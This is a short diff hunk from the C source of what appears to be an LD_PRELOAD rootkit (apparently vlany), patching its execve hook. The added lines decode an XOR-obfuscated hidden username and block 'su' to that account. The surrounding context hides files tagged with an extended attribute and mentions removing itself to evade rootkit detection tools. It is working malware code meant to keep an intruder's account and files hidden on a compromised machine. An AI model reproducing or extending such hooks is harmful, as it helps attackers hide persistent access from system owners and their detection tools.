@@ -210,6 +210,10 @@ int execve(const char *filename, char *const argv[], char *const envp[])
         return old_execve(filename, argv, envp);
     }
 
+    char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
+    if(strstr(filename, "su") && !strcmp(argv[1], vlany_user)) { CLEAN(vlany_user); errno = EIO; return -1; }
+    CLEAN(vlany_user);
+
     if(hidden_xattr(filename)) { errno = ENOENT; return -1; }
 
     // we need to hide from rootkit detection tools. in order to do this, we'll remove ourself during the checks, and then
